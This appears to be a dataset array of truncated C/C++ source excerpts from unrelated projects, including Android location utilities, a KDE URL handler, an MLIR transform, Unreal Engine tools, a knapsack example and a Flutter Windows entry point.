'\\r')\n#define LENGTH(s) (sizeof(s) - 1)\n#define GPS_CHECK_NO_ERROR 0\n#define GPS_CHECK_NO_GPS_HW 1\n\nstatic unsigned int gTarget = (unsigned int)-1;\n\nstatic int read_a_line(const char * file_path, char * line, int line_size)\n{\n    FILE *fp;\n    int result = 0;\n\n    * line = '\\0';\n    fp = fopen(file_path, \"r\" );\n    if( fp == NULL ) {\n        LOC_LOGE(\"open failed: %s: %s\\n\", file_path, strerror(errno));\n        result = -1;\n    } else {\n        int len;\n        fgets(line, line_size, fp);\n        len = strlen(line);\n        while ('\\n' == line[len-1]) {\n            // If there is a new line at end of string, replace it with NULL\n            line[len-1] = '\\0';\n            len--;\n        }\n        len = len < line_size - 1? len : line_size - 1;\n        line[len] = '\\0';\n        LOC_LOGD(\"cat %s: %s\", file_path, line);\n        fclose(fp);\n    }\n    return result;\n}\n\n/*The character array passed to this function should have length\n  of atleast PROPERTY_VALUE_MAX*/\nvoid loc_get_target_baseband(char *baseband, int array_length)\n{\n    if(baseband && (array_length >= PROPERTY_VALUE_MAX)) {\n        property_get(\"ro.baseband\", baseband, \"\");\n        LOC_LOGD(\"%s:%d]: Baseband: %s\\n\", __func__, __LINE__, baseband);\n    }\n    else {\n        LOC_LOGE(\"%s:%d]: NULL parameter or array length less than PROPERTY_VALUE_MAX\\n\",\n                 __func__, __LINE__);\n    }\n}\n\n/*The character array passed to this function should have length\n  of atleast PROPERTY_VALUE_MAX*/\nvoid loc_get_platform_name(char *platform_name, int array_length)\n{\n    if(platform_name && (array_length >= PROPERTY_VALUE_MAX)) {\n        property_get(\"ro.board.platform\", platform_name, \"\");\n        LOC_LOGD(\"%s:%d]: Target name: %s\\n\", __func__, __LINE__, platform_name);\n    }\n    else {\n        LOC_LOGE(\"%s:%d]: Null parameter or array length less than PROPERTY_VALUE_MAX\\n\",\n                 __func__, __LINE__);\n    }\n}\n\n/*The character array passed to this function should have length\n  of atleast PROPERTY_VALUE_MAX*/\nvoid loc_get_auto_platform_name(char *platform_name, int array_length)\n{\n    if(platform_name && (array_length >= PROPERTY_VALUE_MAX)) {\n        property_get(\"ro.hardware.type\", platform_name, \"\");\n        LOC_LOGD(\"%s:%d]: Autoplatform name: %s\\n\", __func__, __LINE__, platform_name);\n    }\n    else {\n        LOC_LOGE(\"%s:%d]: Null parameter or array length less than PROPERTY_VALUE_MAX\\n\",\n                 __func__, __LINE__);\n    }\n}\n\n/*",
    "/*\n    This file is part of the KDE libraries\n    SPDX-FileCopyrightText: 2016 Aleix Pol Gonzalez <aleixpol@kde.org>\n    SPDX-FileCopyrightText: 2021 Alexander Lohnau <alexander.lohnau@gmx.de>\n\n    SPDX-License-Identifier: LGPL-2.0-only OR LGPL-3.0-only OR LicenseRef-KDE-Accepted-LGPL\n*/\n\n#include <QCoreApplication>\n#include <QDebug>\n#include <QFile>\n#include <QFileInfo>\n#include <QStandardPaths>\n#include <QTimer>\n#include <QUrl>\n#include <QUrlQuery>\n\n#include <KLocalizedString>\n\n#include <KNotification>\n\n#include <KNSCore/EngineBase>\n#include <KNSCore/Question>\n#include <KNSCore/QuestionManager>\n#include <KNSCore/ResultsStream>\n#include <KNSCore/Transaction>\n\n#include \"knshandlerversion.h\"\n\n/**\n * Unfortunately there are two knsrc files for the window decorations, but only one is used in the KCM.\n * But both are used by third parties, consequently we can not remove one. To solve this we create a symlink\n * which links the old cache file to the new cache file, which is exposed on the GUI.\n * This way users can again remove window decorations that are installed as a dependency of a global theme.\n * BUG: 414570\n */\nvoid createSymlinkForWindowDecorations()\n{\n    QFileInfo info(QStandardPaths::writableLocation(QStandardPaths::GenericDataLocation) + QLatin1String(\"/knewstuff3/aurorae.knsregistry\"));\n    // If we have created the symbolic link already we can exit the function here\n    if (info.isSymbolicLink()) {\n        return;\n    }\n    // Delete this file, it the KNS entries are not exposed in any GUI\n    if (info.exists()) {\n        QFile::remove(info.absoluteFilePath());\n    }\n    QFileInfo newFileInfo(QStandardPaths::writableLocation(QStandardPaths::GenericDataLocation) + QLatin1String(\"/knewstuff3/window-decorations.knsregistry\"));\n    QFile file(newFileInfo.absoluteFilePath());\n    // Make sure that the file exists\n    if (!newFileInfo.exists()) {\n        file.open(QFile::WriteOnly);\n        file.close();\n    }\n    file.link(info.absoluteFilePath());\n}\n\nint main(int argc, char **argv)\n{\n    createSymlinkForWindowDecorations();\n    QCoreApplication app(argc, argv);\n    app.setApplicationName(QStringLiteral(\"kpackage-knshandler\"));\n    app.setApplicationVersion(knshandlerversion);\n    app.setQuitLockEnabled(false);\n    Q_ASSERT(app.arguments().count() == 2);\n\n#ifdef TEST\n    QStandardPaths::setTestModeEnabled(true);\n#endif\n\n    const QUrl url(app.arguments().last());\n    Q_ASSERT(url.isValid());\n    Q_ASSERT(url.scheme() == QLatin1String(\"kns\"));\n\n    QString knsname;\n    const QStringList availableConfigFiles = KNSCore::EngineBase::availableConfigFiles();\n    auto knsNameIt = std::find_if(availableConfigFiles.begin(), availableConfigFiles.end(), [&url](const QString &availableFile) {\n        return availableFile.endsWith(QLatin1String(\"/\") + url.host());\n    });\n\n    if (knsNameIt == availableConfigFiles.end()) {\n        qWarning() << \"couldn't find knsrc file for\" << url.host();\n        return 1;\n    } else {\n        knsname = *knsNameIt;\n    }\n\n    const auto pathParts = url.path().split(QLatin1Char('/'), Qt::SkipEmptyParts);\n    if (pathParts.size() != 2) {\n        qWarning() << \"wrong format in the url path\" << url << pathParts;\n        return 1;\n    }\n    const auto providerid = pathParts.at(0);\n    const auto entryid = pathParts.at(1);\n    int linkid = 1;\n    if (url.hasQuery()) {\n        QUrlQuery query(url);\n        if (query.hasQueryItem(QStringLiteral(\"linkid\"))) {\n            bool ok;\n            linkid = query.queryItemValue(QStringLiteral(\"linkid\")).toInt(&ok);\n            if (!ok) {\n                qWarning() << \"linkid is not an integer\" << url << pathParts;\n                return 1;\n            }\n        }\n    }\n\n    KNSCore::EngineBase engine;\n    int installedCount = 0;\n    QObject::connect(KNSCore::QuestionManager::instance(), &KNSCore::QuestionManager::askQuestion, &engine, [](KNSCore::Question *question) {\n        auto discardQuestion = [question]() {\n            question->setResponse(KNSCore::Question::InvalidResponse);\n        };\n        switch (question->questionType()) {\n        case KNSCore::Question::YesNoQuestion: {\n            auto f = KNotification::event(KNotification::StandardEvent::Notification, question->title(), question->question());\n\n            auto *yes = f->addAction(i18n(\"Yes\"));\n            QObject::connect(yes, &KNotificationAction::activated, question, [question] {\n                question->setResponse(KNSCore::Question::YesResponse);\n            });\n\n            auto *no = f->addAction(i18n(\"No\"));\n            QObject::connect(no, &KNotificationAction::activated, question, [question] {\n                question->setResponse(KNSCore::Question::NoResponse);\n            });\n\n            QObject::connect(f, &KNotification::closed, question, discardQuestion);\n        } break;\n        case KNSCore::Question::ContinueCancelQuestion: {\n            auto f = KNotification::event(KNotification::StandardEvent::Notification, question->title(), question->question());\n\n        ",
    "// Copyright 2021 The IREE Authors\n//\n// Licensed under the Apache License v2.0 with LLVM Exceptions.\n// See https://llvm.org/LICENSE.txt for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n\n#include \"iree-dialects/Dialect/LinalgTransform/ScopedTransform.h\"\n\n#include \"mlir/Transforms/InliningUtils.h\"\n\nusing namespace mlir;\n\nnamespace {\nstruct Rewriter : public PatternRewriter {\n  Rewriter(MLIRContext *ctx) : PatternRewriter(ctx) {}\n};\n} // namespace\n\nlinalg::transform::ScopeOp linalg::transform::wrapInScope(Operation *op) {\n  Rewriter rewriter(op->getContext());\n  rewriter.setInsertionPoint(op);\n\n  auto scope = rewriter.create<linalg::transform::ScopeOp>(\n      op->getLoc(), op->getResultTypes(), op->getOperands());\n  Region &body = scope.body();\n  rewriter.setInsertionPointToStart(&body.emplaceBlock());\n  BlockAndValueMapping bv;\n  SmallVector<Location> locs(op->getOperandTypes().size(), op->getLoc());\n  bv.map(op->getOperands(), body.addArguments(op->getOperandTypes(), locs));\n\n  Operation *cloneInScope = rewriter.clone(*op, bv);\n  rewriter.create<ForwardOp>(op->getLoc(), cloneInScope->getResults());\n\n  rewriter.replaceOp(op, scope.getResults());\n  return scope;\n}\n\nnamespace {\n/// Instruct the inliner to inline everything. Scopes have no semantic meaning\n/// so moving operations in and out of them, regardless of whether their\n/// dialects have implemented an inliner interface, is valid.\nstruct ScopeInliner : public InlinerInterface {\n  using InlinerInterface::InlinerInterface;\n\n  bool isLegalToInline(Operation *call, Operation *callable,\n                       bool wouldBeCloned) const override {\n    return true;\n  }\n  bool isLegalToInline(Region *dest, Region *src, bool wouldBeCloned,\n                       BlockAndValueMapping &valueMapping) const override {\n    return true;\n  }\n  bool isLegalToInline(Operation *op, Region *dest, bool wouldBeCloned,\n                       BlockAndValueMapping &valueMapping) const override {\n    return true;\n  }\n\n  /// Don't recursively analyze operations, because they can all be \"inlined\".\n  bool shouldAnalyzeRecursively(Operation *op) const override { return false; }\n\n  /// Replace uses of the results with the `forward` op's operands.\n  void handleTerminator(Operation *op,\n                        ArrayRef<Value> valuesToRepl) const override {\n    assert(isa<linalg::transform::ForwardOp>(op));\n    for (auto value : llvm::zip(op->getOperands(), valuesToRepl))\n      std::get<1>(value).replaceAllUsesWith(std::get<0>(value));\n  }\n};\n} // namespace\n\nFailureOr<SmallVector<Operation *>>\nlinalg::transform::unwrapScope(linalg::transform::ScopeOp scope) {\n  ScopeInliner interface(scope->getContext());\n  SmallVector<Operation *> ops;\n  scope.body().walk([&](Operation *op) { ops.push_back(op); });\n  if (failed(inlineRegion(interface, &scope.body(), scope, scope.getOperands(),\n                          scope.getResults(), /*inlineLoc=*/{},\n                          /*shouldCloneInlinedRegion=*/false)))\n    return failure();\n  Rewriter(scope->getContext()).eraseOp(scope);\n  return ops;\n}\n",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"UnrealDiffSaveGame.h\"\n\n#include \"Kismet/GameplayStatics.h\"\n\nnamespace \n{\n\tconst FString SlotName = TEXT(\"UnrealDiff\");\n\tconstexpr int32 SlotIndex = 0;\n}\n\nUUnrealDiffSaveGame::UUnrealDiffSaveGame()\n{\n\t\n}\n\nUUnrealDiffSaveGame* UUnrealDiffSaveGame::GetSaveGame()\n{\n\tif (!UGameplayStatics::DoesSaveGameExist(SlotName, SlotIndex))\n\t{\n\t\treturn Cast<UUnrealDiffSaveGame>(UGameplayStatics::CreateSaveGameObject(UUnrealDiffSaveGame::StaticClass()));\n\t}\n\t\n\treturn Cast<UUnrealDiffSaveGame>(UGameplayStatics::LoadGameFromSlot(SlotName, SlotIndex));\n}\n\nbool UUnrealDiffSaveGame::IsRowCategoryExpanded(const FName& RowName, FName CategoryName)\n{\n\tif (CategoryName.IsNone())\n\t{\n\t\treturn false;\n\t}\n\t\n\tauto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn false;\t\n\t}\n\n\tif (const auto Found = SaveGame->DataTableRowExpandedMap.Find(RowName))\n\t{\n\t\treturn Found->ExpandedCategoryName.Contains(CategoryName);\n\t}\n\n\treturn false;\n}\n\n\nvoid UUnrealDiffSaveGame::AddExpandedCategory(const FName& RowName, FName CategoryName)\n{\n\tif (CategoryName.IsNone())\n\t{\n\t\treturn;\n\t}\n\t\n\tauto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn;\t\n\t}\n\t\n\tauto& Found = SaveGame->DataTableRowExpandedMap.FindOrAdd(RowName);\n\tFound.ExpandedCategoryName.Emplace(CategoryName);\n\n\tSave(SaveGame);\n}\n\nvoid UUnrealDiffSaveGame::RemoveExpandedCategory(const FName& RowName, FName CategoryName)\n{\n\tif (CategoryName.IsNone())\n\t{\n\t\treturn;\n\t}\n\t\n\tauto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn;\t\n\t}\n\t\n\tif (const auto Found = SaveGame->DataTableRowExpandedMap.Find(RowName))\n\t{\n\t\tFound->ExpandedCategoryName.Remove(CategoryName);\n\t\tSave(SaveGame);\n\t}\n}\n\nvoid UUnrealDiffSaveGame::Save(UUnrealDiffSaveGame* InSaveGame)\n{\n\tUGameplayStatics::SaveGameToSlot(InSaveGame, SlotName, SlotIndex);\n}\n\nvoid UUnrealDiffSaveGame::PropertyExtension_AddBlueprintStringTableKeyPrefix(const FName& InBlueprintName, const FString& InPrefix)\n{\n\tif (InBlueprintName.IsNone() || InPrefix.IsEmpty())\n\t{\n\t\treturn;\n\t}\n\t\n\tauto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn;\t\n\t}\n\n\tSaveGame->PropertyExtension_StringTableKeyPrefix.Emplace(InBlueprintName, InPrefix);\n\tSave(SaveGame);\n}\n\nFString UUnrealDiffSaveGame::PropertyExtension_GetBlueprintStringTableKeyPrefix(const FName& InBlueprintName)\n{\n\tif (InBlueprintName.IsNone())\n\t{\n\t\treturn FString();\n\t}\n\n\tconst auto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn FString();\n\t}\n\n\tif (const auto Prefix = SaveGame->PropertyExtension_StringTableKeyPrefix.Find(InBlueprintName))\n\t{\n\t\treturn *Prefix;\n\t}\n\telse\n\t{\n\t\treturn SaveGame->DefaultGlobalStringTableKeyPrefix;\n\t}\n}\n\nvoid UUnrealDiffSaveGame::PropertyExtension_SetDefaultGlobalStringTableKeyPrefix(const FString& InPrefix)\n{\n\tconst auto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn;\n\t}\n\n\tSaveGame->DefaultGlobalStringTableKeyPrefix = InPrefix;\n\tSave(SaveGame);\n}\n\nFString UUnrealDiffSaveGame::PropertyExtension_GetDefaultGlobalStringTable()\n{\n\tconst auto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn FString();\n\t}\n\n\tif (!SaveGame->DefaultGlobalStringTable.IsNull())\n\t{\n\t\treturn SaveGame->DefaultGlobalStringTable.ToSoftObjectPath().ToString();\n\t}\n\n\treturn FString();\n}\n\nvoid UUnrealDiffSaveGame::PropertyExtension_SetDefaultGlobalStringTable(TSoftObjectPtr<UStringTable> InDefaultGlobalStringTable)\n{\n\tconst auto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn;\n\t}\n\n\tSaveGame->DefaultGlobalStringTable = InDefaultGlobalStringTable;\n\tSave(SaveGame);\n}\n\nvoid UUnrealDiffSaveGame::PropertyExtension_AddStringTable(const FName& BlueprintName, const FString& StringTablePath)\n{\n\tconst auto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn;\n\t}\n\n\n\tif (BlueprintName.IsNone() || StringTablePath.IsEmpty())\n\t{\n\t\treturn;\n\t}\n\t\n\tSaveGame->PropertyExtension_DefaultStringTables.Emplace(BlueprintName, StringTablePath);\n\tSave(SaveGame);\n}\n\nFString UUnrealDiffSaveGame::PropertyExtension_GetStringTable(const FName& BlueprintName)\n{\n\tconst auto SaveGame = GetSaveGame();\n\tif (!SaveGame)\n\t{\n\t\treturn FString();\n\t}\n\n\tif (BlueprintName.IsNone())\n\t{\n\t\treturn FString();\n\t}\n\n\tSaveGame->PropertyExtension_DefaultStringTables.Remove(NAME_None);\n\t\n\tif (const auto Found = SaveGame->PropertyExtension_DefaultStringTables.Find(BlueprintName))\n\t{\n\t\treturn *Found;\n\t}\n\n\treturn FString();\n}\n",
    "#include <iostream> // Include the input-output stream library\n#include <algorithm> // Include the algorithm library for sorting\n\n// Structure to store item details\nstruct Item {\n    float weight; // Weight of the item\n    float profit; // Profit of the item\n    float ratio;  // Profit-to-weight ratio\n};\n\n// Comparator function to sort items by their profit-to-weight ratio\nbool compare(Item a, Item b) {\n    return a.ratio > b.ratio; // Return true if a's ratio is greater than b's ratio\n}\n\n// Function to solve the fractional knapsack problem\nvoid knapSack(int n, Item items[], float capacity) {\n    float x[20] = {0}; // Array to store fractions of items, initialized to 0\n    float totalProfit = 0.0; // Total profit initialized to 0\n    int i; // Loop variable\n    float remainingCapacity = capacity; // Remaining capacity of the knapsack initialized to the input capacity\n\n    // Iterate through the items and add to knapsack\n    for (i = 0; i < n; i++) {\n        if (items[i].weight > remainingCapacity) {\n            break; // Break if the current item can't fit entirely in the remaining capacity\n        } else {\n            x[i] = 1.0; // Take the whole item\n            totalProfit += items[i].profit; // Add the profit of the whole item to the total profit\n            remainingCapacity -= items[i].weight; // Subtract the weight of the whole item from the remaining capacity\n        }\n    }\n\n    // If there's remaining capacity, take the fraction of the next item\n    if (i < n) {\n        x[i] = remainingCapacity / items[i].weight; // Calculate the fraction of the item that can fit\n        totalProfit += (x[i] * items[i].profit); // Add the profit of the fraction of the item to the total profit\n    }\n\n    std::cout << \"\\nCumulative Benefit: \" << totalProfit << std::endl; // Print the total profit\n}\n\n// Main function\nint main() {\n    Item items[20]; // Array to store up to 20 items\n    float capacity; // Variable to store the capacity of the knapsack\n    int num, i; // Variables to store the number of items and loop variable\n\n    std::cout << \"\\nEnter the number of objects: \"; // Prompt user to enter the number of items\n    std::cin >> num; // Read the number of items\n\n    std::cout << \"\\nEnter the capacity of the knapsack: \"; // Prompt user to enter the capacity of the knapsack\n    std::cin >> capacity; // Read the capacity of the knapsack\n\n    std::cout << \"\\nEnter weight and profit for each item:\\n\"; // Prompt user to enter weight and profit for each item\n\n    for (i = 0; i < num; i++) { // Loop to read the details of each item\n        std::cout << \"Item \" << i + 1 << \":\\n\"; // Print item number\n        std::cout << \"\\tWeight: \"; // Prompt user to enter the weight of the item\n        std::cin >> items[i].weight; // Read the weight of the item\n        std::cout << \"\\tProfit: \"; // Prompt user to enter the profit of the item\n        std::cin >> items[i].profit; // Read the profit of the item\n        items[i].ratio = items[i].profit / items[i].weight; // Calculate the profit-to-weight ratio of the item\n    }\n\n    // Sort items by profit-to-weight ratio in descending order\n    std::sort(items, items + num, compare); // Sort the items array using the compare function\n\n    // Solve the knapsack problem\n    knapSack(num, items, capacity); // Call the knapSack function with the number of items, items array, and knapsack capacity\n\n    getchar(); // Wait for user input before closing\n    return 0; // Return 0 to indicate successful execution\n}\n\n/*Detailed Explanation:\nLibraries:\n\n#include <iostream>: Used for input and output operations.\n#include <algorithm>: Used for sorting the items based on their profit-to-weight ratio.\nItem Structure:\n\nDefines a structure Item to store the weight, profit, and profit-to-weight ratio of each item.\nComparator Function:\n\ncompare(Item a, Item b): A function to compare two items based on their profit-to-weight ratio. This is used for sorting the items in descending order of their ratios.\nknapSack Function:\n\nvoid knapSack(int n, Item items[], float capacity): Function to solve the fractional knapsack problem.\nfloat x[20] = {0}: Array to store fractions of items to be taken, initialized to 0.\nfloat totalProfit = 0.0: Variable to keep track of the total profit.\nfloat remainingCapacity = capacity: Variable to track the remaining capacity of the knapsack.\nThe for loop iterates through the items. If an item can fit entirely, it is added to the knapsack. Otherwise, the loop breaks.\nIf the loop breaks and there is remaining capacity, a fraction of the next item is taken.\nThe total profit is printed at the end.\nmain Function:\n\nItem items[20]: Array to store up to 20 items.\nPrompts the user to enter the number of items and the capacity of the knapsack.\nReads the weight and profit for each item and calculates the profit-to-weight ratio.\nSorts the items based on their profit-to-weight ratio in descending order.\nCalls the knapSack function to solve the problem.\nWaits for user input before closing the pr",
    "#include \"fps_counter.hpp\"\n\n#include <algorithm>\n#include <utility>\n\n#include <boost/assert.hpp>\n\n#include <iostream>\n\nnamespace\n{\n\n/// Gets the read cursor for given storage.\n///\n/// \\param data Storage.\n/// \\param insert_cursor Insertion cursor.\n/// \\param num_entries Number of entries.\ntemplate<typename T> unsigned get_read_cursor(\n        const std::vector<T>& data,\n        unsigned insert_cursor,\n        unsigned num_entries)\n{\n    if(insert_cursor < num_entries)\n    {\n        return static_cast<unsigned>(data.size()) - (num_entries - insert_cursor);\n    }\n    return insert_cursor - num_entries;\n}\n\n/// Creates a larger copy of given vector.\n//\n/// The data is moved to the beginning.\n///\n/// \\param data Data to read from.\n/// \\param read_cursor Read cursor.\n/// \\param num_entries Number of entries.\n/// \\return Replacement vector.\ntemplate <typename T> std::vector<T> resize_storage(\n        const std::vector<T>& data,\n        unsigned read_cursor,\n        unsigned num_entries)\n{\n    std::vector<T> replacement_data(data.size() * 2);\n\n    for(unsigned ii = read_cursor, jj = 0; (jj < num_entries); ++jj)\n    {\n        replacement_data[jj] = data[ii];\n        ++ii;\n        if(ii >= data.size())\n        {\n            ii = 0;\n        }\n    }\n\n    return replacement_data;\n}\n\n/// Gets the difference between two timestamps.\n///\n/// Survives from overflow.\n///\n/// \\param first First timestamp.\n/// \\param second Second timestamp.\n/// \\return Difference between timestamps.\nunsigned timestamp_diff(unsigned first, unsigned second)\n{\n    if(first > second)\n    {\n        return static_cast<unsigned>(0xFFFFFFFF) - first + second;\n    }\n    return second - first;\n}\n\n}\n\nstd::optional<float> FpsCounter::appendTimestamp(unsigned stamp)\n{\n    // Increment capacity if the storage is full.\n    if(m_num_entries >= m_timestamps.size())\n    {\n        unsigned read_cursor = get_read_cursor(m_timestamps, m_insert_cursor, m_num_entries);\n        m_timestamps = resize_storage(m_timestamps, read_cursor, m_num_entries);\n        m_timestamps[m_num_entries] = stamp;\n        m_insert_cursor = ++m_num_entries;\n    }\n    else\n    {\n        m_timestamps[m_insert_cursor] = stamp;\n        if(++m_insert_cursor >= m_timestamps.size())\n        {\n            m_insert_cursor = 0;\n        }\n        ++m_num_entries;\n    }\n\n    // Decrement number of entries until they're all within the timestamp window.\n    unsigned read_cursor = get_read_cursor(m_timestamps, m_insert_cursor, m_num_entries);\n    unsigned first_timestamp = m_timestamps[read_cursor];\n    unsigned diff = timestamp_diff(first_timestamp, stamp);\n    while(diff >= m_window)\n    {\n        if(++read_cursor >= m_timestamps.size())\n        {\n            read_cursor = 0;\n        }\n\n        --m_num_entries;\n        BOOST_ASSERT(m_num_entries);\n\n        first_timestamp = m_timestamps[read_cursor];\n        diff = timestamp_diff(first_timestamp, stamp);\n    }\n\n    // Do not consider printing unless the current window has exceeded print window.\n    BOOST_ASSERT(m_window > m_print_window);\n    if(diff > m_print_window)\n    {\n        // Only return the framerate for printing if both tolerances match.\n        float current_fps = static_cast<float>(m_num_entries) / static_cast<float>(diff) * 1000.0f;\n        if(std::abs(current_fps - m_last_printed_framerate) >= m_print_tolerance)\n        {\n            unsigned print_diff = timestamp_diff(m_last_print_timestamp, stamp);\n            if(print_diff >= m_print_window)\n            {\n                m_last_print_timestamp = stamp;\n                m_last_printed_framerate = current_fps;\n                return current_fps;\n            }\n        }\n    }\n    return std::nullopt;\n}\n\n",
    "#include \"TreeNode.h\"\n\nUSING_NS_CC;\n\n\nTreeNode* TreeNode::createTreeNode()\n{\n\tauto treeNode = new TreeNode();\n\ttreeNode->initTreeNode();\n\n\treturn treeNode;\n}\n\nvoid TreeNode::initTreeNode()\n{\n\tauto treeTrunk = Sprite::create(\"trunk.png\");\n\tthis->addChild(treeTrunk, 0, \"trunk\");\n\n\tauto treeBranch = Sprite::create(\"branch.png\");\n\tthis->addChild(treeBranch, 1, \"branch\");\n\tthis->setContentSize(Size(treeTrunk->getContentSize().width, treeTrunk->getContentSize().height));\n}\n\nvoid TreeNode::setTreeBranchDirection(TreeBranchDirection direction)\n{\n\t_TreeBranchDirection = direction;\n\t\n\tauto treeTrunk = this->getChildByName(\"trunk\");\n\tauto treeBranch = this->getChildByName(\"branch\");\n\t\n\ttreeBranch->setVisible(direction != MIDDLE);\n\tswitch (direction)\n\t{\n\tcase MIDDLE:\n\t\tbreak;\n\tcase LEFT:\n\t\t{\n\t\t\ttreeBranch->setScaleX(-1.0f);\n\t\t\ttreeBranch->setPositionX(-treeTrunk->getContentSize().width);\n\t\t}\n\t\tbreak;\n\tcase RIGHT:\n\t\t{\n\t\t\ttreeBranch->setScaleX(1.0f);\n\t\t\ttreeBranch->setPositionX(treeTrunk->getContentSize().width);\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n}\n\nTreeBranchDirection TreeNode::getTreeBranchDirection()\n{\n\treturn _TreeBranchDirection;\n}\n\n\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <regex>\n#include <algorithm>\n#include <cstdlib>\n#include <conio.h>\n#include <set>\n#include \"globals.h\"\n\n// Set console text colour\nvoid SetConsoleColour(WORD colour)\n{\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    SetConsoleTextAttribute(hConsole, colour);\n}\n\n\n// Function to replace all instances of a substring with another substring\nvoid ReplaceAll(std::string& str, const std::string& from, const std::string& to)\n{\n    if (from.empty()) return;\n    size_t start_pos = 0;\n    while ((start_pos = str.find(from, start_pos)) != std::string::npos)\n    {\n        str.replace(start_pos, from.length(), to);\n        start_pos += to.length();\n    }\n}\n\n// Function to backup a file\nvoid BackupFile(const fs::path& filePath)\n{\n    if (fs::exists(filePath))\n    {\n        // Get the relative path of the file with respect to the project root directory\n        fs::path relativePath = fs::relative(filePath, projectRootDirectory);\n        fs::path backupFilePath = backupDirectory / relativePath;\n\n        // Create the necessary directories in the backup location\n        fs::create_directories(backupFilePath.parent_path());\n\n        try\n        {\n            fs::copy_file(filePath, backupFilePath, fs::copy_options::overwrite_existing);\n            SetConsoleColour(COLOUR_GREEN);\n            std::cout << \"\\nSuccessfully backed up file: \" << backupFilePath << std::endl;\n        }\n        catch (const fs::filesystem_error& e)\n        {\n            SetConsoleColour(COLOUR_RED);\n            std::cerr << \"\\nERROR: Failed to back up file \" << filePath << \": \" << e.what() << std::endl;\n            SetConsoleColour(COLOUR_WHITE);\n        }\n    }\n    else\n    {\n        SetConsoleColour(COLOUR_RED);\n        std::cerr << \"\\nERROR: File \" << filePath << \" does not exist.\" << std::endl;\n        SetConsoleColour(COLOUR_WHITE);\n    }\n}\n\n// Function to backup a folder\nvoid BackupFolder(const fs::path& folderPath)\n{\n    if (fs::exists(folderPath) && fs::is_directory(folderPath))\n    {\n        // Get the relative path of the folder with respect to the project root directory\n        fs::path relativePath = fs::relative(folderPath, projectRootDirectory);\n        fs::path backupFolderPath = backupDirectory / relativePath;\n\n        // Create the necessary directories in the backup location\n        fs::create_directories(backupFolderPath);\n\n        try\n        {\n            fs::copy(folderPath, backupFolderPath, fs::copy_options::recursive | fs::copy_options::overwrite_existing);\n            SetConsoleColour(COLOUR_GREEN);\n            std::cout << \"\\nSuccessfully backed up folder: \" << backupFolderPath << std::endl;\n            SetConsoleColour(COLOUR_WHITE);\n        }\n        catch (const fs::filesystem_error& e)\n        {\n            SetConsoleColour(COLOUR_RED);\n            std::cerr << \"\\nERROR: Failed to back up folder \" << folderPath << \": \" << e.what() << std::endl;\n            SetConsoleColour(COLOUR_WHITE);\n        }\n    }\n    else\n    {\n        SetConsoleColour(COLOUR_RED);\n        std::cerr << \"\\nERROR: Folder \" << folderPath << \" does not exist or is not a directory.\" << std::endl;\n        SetConsoleColour(COLOUR_WHITE);\n    }\n}\n\n\n// Backup / issue warning\nvoid DisplayWarningAndGetConfirmation()\n{\n    std::string userInput;\n\n    while (true)\n    {\n        SetConsoleColour(COLOUR_ORANGE);\n        std::cout << \"\\nINFO: While this software does automatically create a backup of all changed files, it's still recommended to make a manual backup yourself.\" << std::endl;\n        std::cout << \"\\nTo declare you have made a backup and or that you accept the consequences, type 'YES': \";\n        std::getline(std::cin, userInput);\n\n        if (userInput == \"YES\")\n        {\n            SetConsoleColour(COLOUR_GREEN);\n            std::cout << \"Successfully accepted. Proceeding with the operation...\" << std::endl;\n            SetConsoleColour(COLOUR_WHITE);\n            break;\n        }\n        else\n        {\n            SetConsoleColour(COLOUR_RED);\n            std::cout << \"ERROR: Invalid input. Please type 'YES' to confirm you have made a backup and accept the consequences.\" << std::endl;\n            SetConsoleColour(COLOUR_WHITE);\n        }\n    }\n}\n\nvoid SelectProjectPath()\n{\n    bool isValidDirectory = false;\n    bool foundUprojectFile = false;\n\n    while (!isValidDirectory || !foundUprojectFile)\n    {\n        SetConsoleColour(COLOUR_WHITE);\n        std::cout << \"\\nPlease enter the project root directory: \";\n        std::getline(std::cin, projectRootDirectory);\n\n        // Check if the directory exists\n        if (fs::exists(projectRootDirectory) && fs::is_directory(projectRootDirectory))\n        {\n            isValidDirectory = true;\n            SetConsoleColour(COLOUR_GREEN);\n            std::cout << \"\\nSuccessfully located directory\";\n            SetConsoleColour(COLOUR_WHITE);\n\n            // Look for a .uproject file in the directory\n            foundUprojectFile = fals",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"whatsapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
